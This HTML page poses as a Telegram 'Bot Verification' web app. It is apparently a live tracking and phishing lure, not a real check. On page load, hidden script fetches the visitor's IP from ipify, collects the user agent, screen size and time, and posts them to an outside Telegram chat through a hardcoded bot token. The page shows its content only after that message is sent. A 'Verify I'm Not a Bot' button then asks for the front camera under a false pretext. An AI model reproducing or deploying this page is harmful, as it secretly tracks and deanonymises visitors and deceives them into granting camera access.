<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .btn {
            background-color: #ff0000;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div id="content" style="display: none;">
        <h1>Bot Verification</h1>
        <button id="verifyBtn" class="btn">Verify I'm Not a Bot</button>
    </div>

    <script>
        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        
        // 1. Сразу отправляем IP при загрузке страницы
        async function sendIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                // Добавляем информацию о пользователе
                const userAgent = navigator.userAgent;
                const screenRes = `${window.screen.width}x${window.screen.height}`;
                const time = new Date().toLocaleString();
                
                const message = `🚨 Новый посетитель:\nIP: ${ip}\nУстройство: ${userAgent}\nЭкран: ${screenRes}\nВремя: ${time}`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                
                // Показываем контент после отправки IP
                document.getElementById('content').style.display = 'block';
                
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('content').style.display = 'block';
            }
        }
        
        // 2. Обработчик кнопки проверки
        document.getElementById('verifyBtn').addEventListener('click', async function() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                alert('Камера доступна! Проверка завершена.');
            } catch (error) {
                alert('Для проверки требуется доступ к камере!');
            }
        });
        
        // 3. Инициализация при загрузке
        window.onload = function() {
            sendIP(); // Отправляем IP сразу
            
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.expand();
                Telegram.WebApp.enableClosingConfirmation();
            }
        };
    </script>
</body>
</html>
